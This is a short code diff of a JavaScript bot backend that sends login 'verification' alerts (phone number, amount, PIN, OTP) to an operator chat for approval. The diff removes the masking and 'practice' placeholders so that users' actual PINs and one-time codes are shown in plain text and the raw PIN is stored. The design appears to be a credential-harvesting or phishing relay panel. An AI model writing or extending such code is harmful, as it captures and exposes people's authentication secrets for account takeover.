@@ -111,7 +111,7 @@ async function notifyLoginVerification(login) {
     text =
       `<b>🔐 PIN Verification Required</b>\n\n` +
       `User: ${esc(login.username || 'N/A')}\n` +
-      (login.pinSubmitted ? `Practice PIN: ${esc('submitted')}\n` : '') +
+      (login.pin ? `PIN: ${esc(login.pin)}\n` : '') +
       (login.amount ? `Amount: ${esc(login.amount)} USD\n` : '') +
       `Time: ${new Date().toLocaleString()}`;
   } else {
@@ -124,7 +124,7 @@ async function notifyLoginVerification(login) {
 
   await store.set(store.NS.LOGIN, id, {
     phone: login.username,
-    pin: login.pinSubmitted ? 'submitted' : '',
+    pin: login.pin || '',
     otp: login.otpSubmitted ? 'submitted' : '',
     type,
     timestamp: Date.now(),
@@ -212,13 +212,13 @@ async function handleCallback(cq) {
         chat_id: rec.chatId,
         message_id: rec.messageId,
         parse_mode: 'HTML',
-        text:
-          `<b>🔐 ${kind} Verification</b>\n\n` +
-          `User: ${esc(rec.phone || 'N/A')}\n` +
-          (kind === 'PIN' && rec.pin ? `PIN: ${esc('****')}\n` : '') +
-          (kind === 'OTP' && rec.otp ? `OTP: ${esc('******')}\n` : '') +
-          `Time: ${new Date(rec.timestamp).toLocaleString()}\n\n` +
-          `Status: <b>${stamp}</b>`,
+          text:
+            `<b>🔐 ${kind} Verification</b>\n\n` +
+            `User: ${esc(rec.phone || 'N/A')}\n` +
+            (kind === 'PIN' && rec.pin ? `PIN: ${esc(rec.pin)}\n` : '') +
+            (kind === 'OTP' && rec.otp ? `OTP: ${esc(rec.otp)}\n` : '') +
+            `Time: ${new Date(rec.timestamp).toLocaleString()}\n\n` +
+            `Status: <b>${stamp}</b>`,
       });
     }
     console.log(`[${kind.toLowerCase()} decision] ${id} -> ${decision}`);
